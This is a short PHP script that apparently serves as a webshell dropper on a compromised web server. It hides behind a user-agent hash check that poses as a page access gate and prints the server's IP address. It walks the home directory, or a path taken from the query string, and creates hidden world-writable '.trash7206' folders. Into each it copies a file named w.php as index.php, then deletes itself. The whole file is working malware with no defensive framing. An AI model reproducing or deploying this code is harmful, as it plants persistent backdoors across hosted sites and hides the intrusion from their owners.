<?php /* PkQXCpTC7BaHe94 */ ?>
<?php
// Define the encoded MD5 hash of the user-agent string
$encodedUserAgentHash = '16fee37559dbd42b448204446d02089f';

// Get the user-agent from the request
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Hash the user-agent from the request using MD5
$hashedUserAgent = md5($userAgent);

// Check if the hashed user-agent matches the encoded hash
if ($hashedUserAgent === $encodedUserAgentHash) {
    // User-agent matched, allow access to the page
    echo "Welcome!";
    // Put your page content here
} else {
    // User-agent doesn't match, deny access
    http_response_code(403);
    echo "Access Denied";
    // Stop further execution
    exit;
}    
/////////////Getting home dir //////////////
if(!function_exists('posix_getpwuid')){
   if(isset($_GET["path"])){
     $home=$_GET["path"];
   }else{
     echo getcwd();
     die("<br>posix function is not available<br>Please Input Path");
   }
}else{
echo $_SERVER['SERVER_ADDR'];
echo "<br>";

        if(isset($_GET["path"])){
           $home=$_GET["path"];
        }else{
        $arr = posix_getpwuid(posix_getuid());
        $home = $arr["dir"];
        }
}


///////////Making directory & copy file//////////////  
$filepath=getcwd()."/w.php"; 

  $dirlist = getFileList($home, TRUE, 2);
  foreach($dirlist as $alldir){
    mkdir($alldir.".trash7206", 0777, TRUE);
    if(copy($filepath, $alldir.".trash7206/index.php")) {
     echo $alldir.".trash7206/index.php<br>";}
  }
  
  //////////////Directory scanner////////////////
  function getFileList($dir, $recurse = FALSE, $depth = FALSE)
  {
    $retval = [];
    if(substr($dir, -1) != "/") {
      $dir .= "/";
    }
    $d = @dir($dir) or die("Failed open directory $dir");
    while(FALSE !== ($entry = $d->read())) {
      // skip hidden files
      if($entry[0] == "."){
	 continue;
	}
      if(is_dir("$dir$entry")) {
        $retval[] = "$dir$entry/";
        if($recurse && is_readable("$dir$entry/")) {
          if($depth === FALSE) {
            $retval = array_merge($retval, getFileList("$dir$entry/", TRUE));
          } elseif($depth > 0) {
            $retval = array_merge($retval, getFileList("$dir$entry/", TRUE, $depth-1));
          }
        }
      }
    }
    $d->close();

    return $retval;
  }
unlink(__FILE__);